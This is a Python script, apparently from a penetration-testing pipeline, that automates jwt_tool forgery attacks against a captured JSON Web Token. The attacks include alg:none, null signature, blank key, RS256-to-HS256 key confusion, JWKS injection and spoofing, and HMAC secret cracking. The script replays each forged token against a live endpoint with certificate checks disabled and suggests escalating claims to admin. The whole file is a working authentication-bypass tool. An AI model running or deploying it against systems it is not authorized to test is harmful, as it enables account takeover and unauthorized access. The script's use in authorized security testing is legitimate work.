#!/usr/bin/env python3
"""run_jwt_tool.py - drive jwt_tool across the JWT attack set and verify by replay.

Runs the exploit battery (alg:none, null signature, blank key, RS->HS key
confusion, inline-JWKS injection, JWKS spoof, secret cracking) against a
captured token, extracts every forged token jwt_tool emits, replays each one
against a protected endpoint, and compares with auth/unauth baselines.

Usage:
  python3 scripts/run_jwt_tool.py --token 'eyJ...' \
      --url 'https://api.example.com/v1/me' \
      --header 'Authorization: Bearer TOKEN' \
      --pubkey public.pem --wordlist jwt.secrets.list \
      --attacks none,nullsig,blank,confusion,inject-jwks,crack \
      --outdir reports

Outputs (written atomically):
  reports/jwt-attacks-results.json  - normalized intermediate (all attempts)
  reports/jwt-attacks-units.json    - rupu work units for confirmed hits / follow-ups

Requires jwt_tool on PATH (or --jwt-tool /path/to/jwt_tool.py). Replay uses
urllib only (stdlib). The literal string TOKEN in --header/--cookie/--data is
replaced with each candidate token.
"""
import argparse
import json
import os
import re
import shlex
import ssl
import subprocess
import sys
import tempfile
import time
import urllib.error
import urllib.request

TOKEN_RE = re.compile(r"eyJ[A-Za-z0-9_-]{4,}\.[A-Za-z0-9_-]{2,}\.[A-Za-z0-9_-]*")
ANSI_RE = re.compile(r"\x1b\[[0-9;]*m")
CRACK_RE = re.compile(r"\[\+\]\s+(.*?)\s+is the CORRECT key!")
TARGET_CAP = 4096

HINTS = {
    "accepted": ["forged token accepted", "escalate claims: -I -pc role -pv admin",
                 "findings.report with http_exchange", "assets.mark depth exploited"],
    "cracked": ["secret recovered", "forge: jwt_tool -I -pc role -pv admin -S hs256 -p SECRET",
                "replay-against-endpoint"],
    "retest": ["jwt_tool emitted tokens, replay manually", "replay-against-endpoint"],
}

TITLES = {
    "none": "jwt alg none forgery",
    "nullsig": "jwt null signature forgery",
    "blank": "jwt blank hmac key forgery",
    "confusion": "jwt key confusion rs256-hs256",
    "inject-jwks": "jwt inline jwks injection",
    "spoof-jwks": "jwt jwks url spoof",
    "crack": "jwt hmac secret crack",
}


def build_attacks(args):
    atk = {
        "none": ["-X", "a"],
        "nullsig": ["-X", "n"],
        "blank": ["-X", "b"],
        "inject-jwks": ["-X", "i"],
    }
    if args.pubkey:
        atk["confusion"] = ["-X", "k", "-pk", args.pubkey]
    if args.jku:
        atk["spoof-jwks"] = ["-X", "s", "-ju", args.jku]
    if args.wordlist:
        atk["crack"] = ["-C", "-d", args.wordlist]
    return atk


def run_jwt_tool(jwt_tool, token, extra, timeout):
    cmd = shlex.split(jwt_tool) + [token] + extra
    try:
        p = subprocess.run(cmd, stdin=subprocess.DEVNULL, capture_output=True,
                           text=True, timeout=timeout)
    except FileNotFoundError:
        print("jwt_tool not found: %s (use --jwt-tool)" % jwt_tool, file=sys.stderr)
        sys.exit(2)
    except subprocess.TimeoutExpired as e:
        out = (e.stdout or "") + (e.stderr or "")
        return ANSI_RE.sub("", out if isinstance(out, str) else out.decode(errors="replace")), -1
    return ANSI_RE.sub("", (p.stdout or "") + (p.stderr or "")), p.returncode


def replay(url, method, headers, cookie_tpl, data_tpl, token, timeout):
    hdrs = {}
    for h in headers:
        line = h.replace("TOKEN", token)
        if ":" in line:
            k, v = line.split(":", 1)
            hdrs[k.strip()] = v.strip()
    if cookie_tpl:
        hdrs["Cookie"] = cookie_tpl.replace("TOKEN", token)
    body = data_tpl.replace("TOKEN", token).encode() if data_tpl else None
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    req = urllib.request.Request(url, data=body, headers=hdrs,
                                 method=method or ("POST" if body else "GET"))
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            raw = r.read()
            return {"status": r.status, "length": len(raw),
                    "snippet": raw[:400].decode(errors="replace")}
    except urllib.error.HTTPError as e:
        raw = e.read()
        return {"status": e.code, "length": len(raw),
                "snippet": raw[:400].decode(errors="replace")}
    except (urllib.error.URLError, OSError) as e:
        return {"status": 0, "length": 0, "snippet": "error: %s" % e}


def judge(result, auth, unauth):
    """accepted if the forged response looks like the authenticated baseline
    and unlike the garbage-token baseline."""
    if result["status"] == 0:
        return False
    if result["status"] == unauth["status"] and abs(result["length"] - unauth["length"]) < 32:
        return False
    if result["status"] == auth["status"]:
        return True
    return result["status"] < 400 <= unauth["status"]


def write_atomic(path, data):
    d = os.path.dirname(path) or "."
    os.makedirs(d, exist_ok=True)
    fd, tmp = tempfile.mkstemp(prefix=".jwtres-", dir=d)
    try:
        with os.fdopen(fd, "w") as f:
            json.dump(data, f, indent=2)
            f.write("\n")
        os.replace(tmp, path)
    except BaseException:
        try:
            os.unlink(tmp)
        except OSError:
            pass
        raise


def main():
    ap = argparse.ArgumentParser(description="jwt_tool attack battery + replay verification")
    ap.add_argument("--token", required=True, help="the captured valid JWT")
    ap.add_argument("--url", required=True, help="protected endpoint used as acceptance oracle")
    ap.add_argument("--method", default=None, help="HTTP method (default GET, POST if --data)")
    ap.add_argument("--header", action="append", default=[],
                    help="request header template, TOKEN is substituted; repeatable "
                         "(default: 'Authorization: Bearer TOKEN')")
    ap.add_argument("--cookie", default=None, help="cookie template, e.g. 'session=TOKEN'")
    ap.add_argument("--data", default=None, help="POST body template (TOKEN substituted)")
    ap.add_argument("--pubkey", default=None, help="RSA public key PEM for -X k key confusion")
    ap.add_argument("--jku", default=None, help="attacker JWKS URL for -X s spoofing")
    ap.add_argument("--wordlist", default=None, help="wordlist for -C -d cracking")
    ap.add_argument("--attacks", default=None,
                    help="comma list: none,nullsig,blank,confusion,inject-jwks,spoof-jwks,crack "
                         "(default: all applicable)")
    ap.add_argument("--jwt-tool", default="jwt_tool", dest="jwt_tool",
                    help="jwt_tool command (e.g. 'python3 /opt/jwt_tool/jwt_tool.py')")
    ap.add_argument("--timeout", type=int, default=15, help="per-request timeout seconds")
    ap.add_argument("--tool-timeout", type=int, default=600, help="per-jwt_tool-run timeout")
    ap.add_argument("--outdir", default="reports")
    args = ap.parse_args()
    if not args.header and not args.cookie and not args.data:
        args.header = ["Authorization: Bearer TOKEN"]

    attacks = build_attacks(args)
    if args.attacks:
        wanted = [a.strip() for a in args.attacks.split(",") if a.strip()]
        missing = [a for a in wanted if a not in attacks]
        if missing:
            print("skipping (missing prerequisite --pubkey/--jku/--wordlist or unknown): %s"
                  % ", ".join(missing), file=sys.stderr)
        attacks = {k: v for k, v in attacks.items() if k in wanted}

    rp = lambda tok: replay(args.url, args.method, args.header, args.cookie,
                            args.data, tok, args.timeout)
    auth = rp(args.token)
    unauth = rp("eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ4In0.aW52YWxpZHNpZ25hdHVyZQ")
    print("[*] baseline auth:   %s (%d bytes)" % (auth["status"], auth["length"]))
    print("[*] baseline garbage: %s (%d bytes)" % (unauth["status"], unauth["length"]))
    if auth["status"] == unauth["status"] and abs(auth["length"] - unauth["length"]) < 32:
        print("[!] endpoint does not discriminate valid vs garbage token - "
              "pick a different --url, results will be unreliable", file=sys.stderr)

    results = {"url": args.url, "generated": int(time.time()),
               "baseline_auth": auth, "baseline_unauth": unauth, "attacks": []}
    units = []
    uid = 0

    for name, extra in attacks.items():
        print("[*] attack: %s -> jwt_tool %s" % (name, " ".join(extra)))
        out, rc = run_jwt_tool(args.jwt_tool, args.token, extra, args.tool_timeout)
        entry = {"attack": name, "jwt_tool_args": extra, "returncode": rc,
                 "cracked_secret": None, "candidates": []}

        m = CRACK_RE.search(out)
        if name == "crack" and m:
            secret = m.group(1)
            entry["cracked_secret"] = secret
            print("[+] cracked HMAC secret: %r" % secret)
            # forge a re-signed token (bump exp a year) with the recovered secret
            forge_out, _ = run_jwt_tool(
                args.jwt_tool, args.token,
                ["-I", "-pc", "exp", "-pv", str(int(time.time()) + 31536000),
                 "-S", "hs256", "-p", secret],
                args.tool_timeout)
            out += "\n" + forge_out
            uid += 1
            units.append({"id": "jwt-cracked-%d" % uid, "title": TITLES["crack"],
                          "targets": [args.url[:TARGET_CAP], secret[:TARGET_CAP]],
                          "hints": HINTS["cracked"]})

        forged = [t for t in dict.fromkeys(TOKEN_RE.findall(out)) if t != args.token]
        for tok in forged:
            res = rp(tok)
            accepted = judge(res, auth, unauth)
            entry["candidates"].append({"token": tok, "replay": res, "accepted": accepted})
            if accepted:
                print("[+] ACCEPTED (%s): %s... status=%s" % (name, tok[:40], res["status"]))
                uid += 1
                units.append({"id": "jwt-accepted-%d" % uid,
                              "title": TITLES.get(name, "jwt forged token accepted"),
                              "targets": [args.url[:TARGET_CAP], tok[:TARGET_CAP]],
                              "hints": HINTS["accepted"]})
        if not forged and name != "crack":
            print("    no forged tokens emitted (rc=%d); check jwt_tool output manually" % rc)
        results["attacks"].append(entry)

    res_path = os.path.join(args.outdir, "jwt-attacks-results.json")
    units_path = os.path.join(args.outdir, "jwt-attacks-units.json")
    write_atomic(res_path, results)
    write_atomic(units_path, units)
    n_hits = sum(1 for a in results["attacks"] for c in a["candidates"] if c["accepted"])
    print("[*] %d accepted forgeries, %d work units" % (n_hits, len(units)))
    print("[*] results -> %s" % res_path)
    print("[*] units   -> %s" % units_path)
    print("[*] next: findings.report per accepted forgery (see references/rupu.md); "
          "mark endpoint tested/exploited with assets.mark")
    return 0


if __name__ == "__main__":
    sys.exit(main())
